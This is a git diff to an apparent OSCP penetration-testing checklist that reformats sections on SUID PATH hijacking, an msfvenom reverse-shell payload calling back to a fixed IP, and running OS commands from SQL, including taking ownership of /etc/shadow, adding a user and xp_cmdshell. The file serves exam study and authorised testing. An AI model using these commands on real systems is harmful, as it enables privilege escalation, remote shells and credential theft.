@@ -37,6 +37,8 @@
   - [Misc stuff]()
   - [Useful lists and files on Kali](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#useful-file-locations)
   - [Shells](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#shells)
+  - [Path Manipulation]
+  - [SQL OS Commands]
 - [Essential Reading](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#essential-reading)
 * * * 
 
@@ -840,26 +842,34 @@ exec "/bin/sh" (IRB)
 !sh (nmap)
 ```
 
+# PATH Manipulation
+
 #### Custom code running other binaries - PATH manipulation:
-If you are running a SUID which executes a shared binary (e.g., cat), we can manipulate the PATH variable to run
-our own file which we call cat.
+If you are running a SUID which executes a shared binary (e.g., ```cat```), we can manipulate the PATH variable to run our own file when (e.g., ```cat```) is called:
+
+```
 echo “/bin/bash” > /tmp/cat
-chmod +x /tmp/cast
+chmod +x /tmp/cat
 export PATH=/tmp:$PATH
-./runcatSUID
+./run_cat_dependantSUID
+```
 
 #### Another trick is to create a reverse shell with msfvenom and place that in the set PATH
-(msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.223 LPORT=555 -f elf -o shell)
-Execute OS Commands from within SQL
+```msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.223 LPORT=555 -f elf -o shell```
 
-#### SQL:
+* * *
+
+#### Execute OS Commands from within SQL
+
+```
 \! whoami
 sys_exec('chown john.john /etc/shadow')
 SELECT sys_exec("net users lecon lecon /add");
 MSSQL:
 EXEC xp_cmdshell 'dir *.exe';
 GO
-  
+```
+
 # If your stuck:
 #### Vector
 - Enumerate more... FROM THE TOP, do NOT SKIP ANY STEPS!!
